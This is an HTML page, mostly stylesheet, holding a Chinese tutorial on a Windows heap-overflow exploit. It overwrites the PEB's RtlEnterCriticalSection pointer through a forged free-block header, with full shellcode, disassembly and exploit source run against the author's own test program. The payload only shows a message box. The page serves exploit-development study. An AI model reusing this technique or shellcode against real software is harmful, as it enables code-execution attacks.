@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Shellcode executing in heap overrun</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="shellcode-executing-in-heap-overrun">Shellcode executing in heap overrun</h1>
+<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
+<pre><code>#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;;//200 bytes 0x90
+
+int main()
+{
+    HLOCAL h1 = 0, h2 = 0;
+    HANDLE hp;
+    hp = HeapCreate(0, 0x1000, 0x10000);
+    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
+    __asm int 3 //used to break the process
+    memcpy(h1, shellcode, 200); //normal cpy, used to watch the heap
+    //memcpy(h1, shellcode, 0x200); //overflow,0x200=512
+    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
+    return 0;
+}
+</code></pre><p>生成release版本，然后attach</p>
+<p><img src="Image/1.png" alt=""></p>
+<p>直接来到分配的堆块，然后nop填充掉<code>int 3</code>，F8单步走下去，直到<code>0x90</code>覆盖整个堆块</p>
+<p><img src="Image/2.png" alt=""></p>
+<p>可以看出来，200字节的<code>0x90</code>刚好填充整个堆块，后面跟着的是尾块的块首，接下来就是用溢出来覆盖堆块的两个指针<br>先来看看需要使用的shellcode</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+char shellcode[] = 
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90&quot;
+    //repaire the pointer which shooted by heap over run
+    &quot;\xB8\x20\xF0\xFD\x7F&quot;  //MOV EAX,7FFDF020
+    &quot;\xBB\x60\x20\xF8\x77&quot;  //MOV EBX,77F8AA4C the address here may releated to your OS
+    &quot;\x89\x18&quot;            //MOV DWORD PTR DS:[EAX],EBX
+    &quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;
+    &quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;
+    &quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;
+    &quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;
+    &quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;
+    &quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;
+    &quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;
+    &quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;
+    &quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;
+    &quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;
+    &quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block
+    &quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;;
+    //0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug 
+    //0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()
+    //and will be called by ExitProcess() at last
+
+int main()
+{
+    __asm
+    {
+        lea eax,shellcode
+        push eax
+        ret
+    }
+    return 0;
+}
+</code></pre><p>生成后载入OD看看长啥样</p>
+<p><img src="Image/3.png" alt=""></p>
+<p>代码</p>
+<pre><code>00406030    90              nop
+00406031    90              nop
+00406032    90              nop
+00406033    90              nop
+00406034    90              nop
+00406035    90              nop
+00406036    90              nop
+00406037    90              nop
+00406038    90              nop
+00406039    90              nop
+0040603A    90              nop
+0040603B    90              nop
+0040603C    B8 20F0FD7F     mov     eax, 7FFDF020
+00406041    BB 6020F877     mov     ebx, ntdll.RtlEnterCriticalSecti&amp;gt;
+00406046    8918            mov     dword ptr [eax], ebx
+00406048    FC              cld
+00406049    68 6A0A381E     push    1E380A6A
+0040604E    68 6389D14F     push    4FD18963
+00406053    68 3274910C     push    0C917432
+00406058    8BF4            mov     esi, esp
+0040605A    8D7E F4         lea     edi, dword ptr [esi-C]
+0040605D    33DB            xor     ebx, ebx
+0040605F    B7 04           mov     bh, 4
+00406061    2BE3            sub     esp, ebx
+00406063    66:BB 3332      mov     bx, 3233
+00406067    53              push    ebx
+00406068    68 75736572     push    72657375
+0040606D    54              push    esp
+0040606E    33D2            xor     edx, edx
+00406070    64:8B5A 30      mov     ebx, dword ptr fs:[edx+30]
+00406074    8B4B 0C         mov     ecx, dword ptr [ebx+C]
+00406077    8B49 1C         mov     ecx, dword ptr [ecx+1C]
+0040607A    8B09            mov     ecx, dword ptr [ecx]
+0040607C    8B69 08         mov     ebp, dword ptr [ecx+8]
+0040607F    AD              lods    dword ptr [esi]
+00406080    3D 6A0A381E     cmp     eax, 1E380A6A
+00406085    75 05           jnz     short 0040608C
+00406087    95              xchg    eax, ebp
+00406088    FF57 F8         call    dword ptr [edi-8]
+0040608B    95              xchg    eax, ebp
+0040608C    60              pushad
+0040608D    8B45 3C         mov     eax, dword ptr [ebp+3C]
+00406090    8B4C05 78       mov     ecx, dword ptr [ebp+eax+78]
+00406094    03CD            add     ecx, ebp
+00406096    8B59 20         mov     ebx, dword ptr [ecx+20]
+00406099    03DD            add     ebx, ebp
+0040609B    33FF            xor     edi, edi
+0040609D    47              inc     edi
+0040609E    8B34BB          mov     esi, dword ptr [ebx+edi*4]
+004060A1    03F5            add     esi, ebp
+004060A3    99              cdq
+004060A4    0FBE06          movsx   eax, byte ptr [esi]
+004060A7    3AC4            cmp     al, ah
+004060A9    74 08           je      short 004060B3
+004060AB    C1CA 07         ror     edx, 7
+004060AE    03D0            add     edx, eax
+004060B0    46              inc     esi
+004060B1  ^ EB F1           jmp     short 004060A4
+004060B3    3B5424 1C       cmp     edx, dword ptr [esp+1C]
+004060B7  ^ 75 E4           jnz     short 0040609D
+004060B9    8B59 24         mov     ebx, dword ptr [ecx+24]
+004060BC    03DD            add     ebx, ebp
+004060BE    66:8B3C7B       mov     di, word ptr [ebx+edi*2]
+004060C2    8B59 1C         mov     ebx, dword ptr [ecx+1C]
+004060C5    03DD            add     ebx, ebp
+004060C7    032CBB          add     ebp, dword ptr [ebx+edi*4]
+004060CA    95              xchg    eax, ebp
+004060CB    5F              pop     edi
+004060CC    AB              stos    dword ptr es:[edi]
+004060CD    57              push    edi
+004060CE    61              popad
+004060CF    3D 6A0A381E     cmp     eax, 1E380A6A
+004060D4  ^ 75 A9           jnz     short 0040607F
+004060D6    33DB            xor     ebx, ebx
+004060D8    53              push    ebx
+004060D9    68 77657374     push    74736577
+004060DE    68 6661696C     push    6C696166
+004060E3    8BC4            mov     eax, esp
+004060E5    53              push    ebx
+004060E6    50              push    eax
+004060E7    50              push    eax
+004060E8    53              push    ebx
+004060E9    FF57 FC         call    dword ptr [edi-4]
+004060EC    53              push    ebx
+004060ED    FF57 F8         call    dword ptr [edi-8]
+004060F0    90              nop
+004060F1    90              nop
+004060F2    90              nop
+004060F3    90              nop
+004060F4    90              nop
+004060F5    90              nop
+004060F6    90              nop
+004060F7    90              nop
+</code></pre><p>讲一下为什么这样写：<code>ExitProcess()</code>在结束进程时会调用临界区函数<code>RtlEnterCriticalSection()</code>来同步线程，而且这个函数指针在PEB中偏移<code>0x20</code>的位置<code>0x7ffdf020</code>，是的，固定的，但是该函数指针的值在不同的操作系统上不一样，需要先记住，一定要记住，直接<code>Ctrl+G</code>到<code>0x7ffdf020</code>就可以看到这个函数的指针了，那么<code>DWORDSHOOT</code>的目标就有了，咱们把shellcode里尾块的块首先按照自己的堆块信息修改好，不同的操作系统堆区起始位置可能不太一样，需要在shellcode里修改，溢出后，当h2分配的时候，伪造的指针就会进行<code>DWORDSHOOT</code>，将shellcode的起始位置写入临界区函数<code>RtlEnterCriticalSection()</code>的地址，这时候堆溢出就会导致异常，异常了就会调用<code>ExitProcess()</code>函数结束线程，是的，没有错，会取出临界区函数<code>RtlEnterCriticalSection()</code>的指针，这个指针的值已经被我们shellcode的起始位置覆盖了，所以就回去执行shellcode，然而！！！！！！</p>
+<p>刚刚我说：记住临界区函数<code>RtlEnterCriticalSection()</code>的指针的值，为什么？</p>
+<p>因为shellcode也会调用临界区函数<code>RtlEnterCriticalSection()</code>，但是这时候取出的值又是shellcode的值，这咋整？所以刚刚记住的真实地址就有用了，咱们的shellcode前面不是一堆0x90嘛，在那里修复一下临界区函数<code>RtlEnterCriticalSection()</code>函数指针的值，然后继续执行shellcode</p>
+<p>完整的代码</p>
+<pre><code>#include &lt;windows.h&gt;
+
+char shellcode[]=
+    &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x90\x90\x90\x90&quot;
+    //repaire the pointer which shooted by heap over run
+    &quot;\xB8\x20\xF0\xFD\x7F&quot;  //MOV EAX,7FFDF020
+    &quot;\xBB\x60\x20\xF8\x77&quot;  //MOV EBX,77F8AA4C the address here may releated to your OS
+    &quot;\x89\x18&quot;            //MOV DWORD PTR DS:[EAX],EBX
+    &quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;
+    &quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;
+    &quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;
+    &quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;
+    &quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;
+    &quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;
+    &quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;
+    &quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;
+    &quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;
+    &quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;
+    &quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    &quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block
+    &quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;;
+    //0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug 
+    //0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()
+    //and will be called by ExitProcess() at last
+
+
+main()
+{
+    HLOCAL h1 = 0, h2 = 0;
+    HANDLE hp;
+    hp = HeapCreate(0, 0x1000, 0x10000);
+    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
+    //__asm int 3 //used to break the process
+    //memcpy(h1, shellcode, 200); //normal cpy, used to watch the heap
+    memcpy(h1, shellcode, 0x200); //overflow,0x200=512
+    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
+    return 0;
+}
+</code></pre><p>生成release，运行</p>
+<p><img src="Image/4.png" alt=""></p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
